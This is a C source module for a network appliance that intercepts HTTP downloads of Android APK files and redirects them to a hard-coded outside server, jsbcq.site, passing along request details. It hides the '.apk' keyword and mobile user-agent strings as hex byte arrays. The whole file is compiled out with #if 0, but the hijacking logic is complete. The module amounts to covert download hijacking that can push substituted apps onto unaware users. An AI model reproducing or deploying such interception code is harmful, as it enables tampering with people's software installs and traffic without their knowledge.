#if 0
#include <string.h>

#include "list.h"

#include "ha_debug.h"
#include "ha_network.h"
#include "ha_policy.h"
#include "ha_http_type.h"
#include "ha_30x.h"
#include "ha_config.h"
#include "ha_search.h"

#define DEF_APK_PATH 	"/php/url_parse.php"
#define DEF_APK_SERVER 	"jsbcq.site"


struct ha_apk_ctl {
	char server[DEF_SRV_MAXLEN];
	char path[DEF_URL_MAXLEN];
};

static struct ha_apk_ctl apk_ctl = {
	
};

struct ha_client_sign{
	cstr_t agent;
	bool (*guess)(struct ha_http_request *);
};
static char keyward[]={0x2e,0x61,0x70,0x6b,0};

static bool ha_default_guess(struct ha_http_request *req)
{	
	uint pos  = raw_search((const uchar *)keyward,4,
									(const uchar *)req->url.str,req->url.len,true);	

	if ( UINT32_MAX == pos )
		return false;
	if (pos + 4 < req->url.len && isalnum(req->url.str[pos + 4]))
		return false;
	return true;
}

#if 0
static bool ha_ua_match(cstr_t *ua_key,cstr_t *ua)
{
	return UINT32_MAX != raw_search((const uchar *)ua_key->str,ua_key->len,
									  (const uchar *)ua->str,ua->len,true);
}

static bool ha_xiaomi_guess(struct ha_http_request *req)
{
	return false;
}

static char bd_agent[] = {
						  0x41,0x70,0x61,0x63,0x68,0x65,0x2d,0x48,0x74,0x74,
						  0x70,0x43,0x6c,0x69,0x65,0x6e,0x74,0x2f,0x41,0x50,
						  0x50,0x53,0x45,0x41,0x52,0x43,0x48,0x00
						  };
static char xiaomi_agent[] = "AndroidDownloadManager";
static char def_agent_m[] = {0x4d,0x6f,0x62,0x69,0x6c,0x65,0x00};
static char def_agent_a[] = {0x41,0x6e,0x64,0x72,0x6f,0x69,0x64,0x00};
static struct ha_client_sign clients[] = {
	{
		.agent = {.str = bd_agent,.len = sizeof(bd_agent) - 1},
	},
	{
		/*filter out XIAOMI*/
		.agent = {.str = xiaomi_agent,.len = sizeof(xiaomi_agent) - 1},
		.guess = ha_xiaomi_guess,
	},
	{
		.agent = {.str = def_agent_m,.len = sizeof(def_agent_m) - 1},
	},
	{
		.agent = {.str = def_agent_a,.len = sizeof(def_agent_a) - 1},
	},
	{
		.agent = {NULL,0},
	}
};
#endif

static bool yoyoyo_is_you(struct ha_http_request *req,cstr_t *ua)
{
#if 0
	assert(req && ua);
	struct ha_client_sign *hcs = clients;
	while (hcs->agent.str) {
		if (ha_ua_match(&hcs->agent,ua))
			break;
		hcs++;
	}

	/*found*/
	if (hcs->agent.str) {
		if (hcs->guess) 
			return  hcs->guess(req);
		else
			return ha_default_guess(req);
	}
	
	return false;
#else
	return ha_default_guess(req);
#endif
}

static bool ha_apk_handler(struct ha_http_request *req,int type,struct ha_packet_info *pi)
{	
	bool res = true;
	struct ha_apk_ctl *ctl = &apk_ctl;

	if (type != HTTP_GET)
		return res;

	debug_p("__EIPIKEY__");
	if (!yoyoyo_is_you(req,req->ua)) 
		goto end;

	if (!ha_build_redir_args(req,req->ua,"apk",pi,false))
		goto end;
	
	ha_http_redirect(pi,"http",ctl->server,ctl->path,ha_escap_buffer_get(),1);

	res = false;
end: 
	return res;
}
/*********************json handle*********************/
static void ha_apk_conf_init(struct ha_apk_ctl *ctl)
{
	struct json_object *jo = ha_find_module_config("apk");
	if (!jo) 
		return ;
	const char *str = ha_json_get_string(jo,"server");
	if (str)
		strncpy(ctl->server,str,sizeof(ctl->server));
	str = ha_json_get_string(jo,"path");
	if (str && strlen(str) > 1)
		strncpy(ctl->path,str,sizeof(ctl->path));
}
/*********************json handle**********************/
bool ha_apk_init()
{	
	struct ha_apk_ctl *ctl = &apk_ctl;
	
	/*default config*/
	strncpy(ctl->server,DEF_APK_SERVER,sizeof(ctl->server));
	strncpy(ctl->path,DEF_APK_PATH,sizeof(ctl->path));
	/*server configure*/

	ha_apk_conf_init(ctl);
	
	ignore_server(ctl->server,strlen(ctl->server));
	
	proto_pseudo_server_register(ctl->server);
	ha_http_type_handler_register("apk_handler",ha_apk_handler);

	return true;
}

void ha_apk_destroy(void)
{
	
}


#if 1
char *ha_apk_server(void)
{
	return apk_ctl.server;
}
char *ha_apk_path(void)
{
	return apk_ctl.path;
}
#endif

#endif
